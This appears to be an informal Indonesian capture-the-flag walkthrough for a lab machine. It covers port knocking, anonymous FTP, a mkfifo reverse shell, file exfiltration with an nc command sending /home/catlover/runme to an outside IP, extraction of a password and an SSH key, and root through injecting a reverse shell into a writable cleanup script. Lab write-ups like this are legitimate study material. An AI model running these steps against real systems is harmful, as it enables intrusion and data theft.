# boot:
1. scan port 21 22 8080 buat http nya kebuka ada port docker port ftp gabisa di masukin
2. fuzz ada /feed ->  cek aja ada isinya xml -> cek source code ada katanya knock knock 1111 2222 3333 4444
3. pake knockd -> knock ip port port port port -v -> abis itu nmap lagi aja nanti ada port baru terus ftp nya jadi open
4. cek di ftp Anonymous -> get namafile -> ada catatan katanya ada port lain yang perlu di masukin
5. nc ip portyangdisuruh -> revshell mkfifo aja disitu pake nc lain
6. explore file nanti ada file -> nyalain nc port > namafile -> di mesin target gini: nc 10.17.45.126 6060 < /home/catlover/runme
7. file runme -> strings runme -> run runme di mesin target -> ./runme -> dia butuh passwd di strings runme ada tuh passwd rebeca nya
8. nanti muncul id_rsa disitu pake aja -> ssh pake itu ke catlover


# rootflag:
1. ls /opt tuh ada /clean masuk aja baca dia nge rf
2. revshell bash disitu -> echo "revshell" nyalain nc
3. klaim root
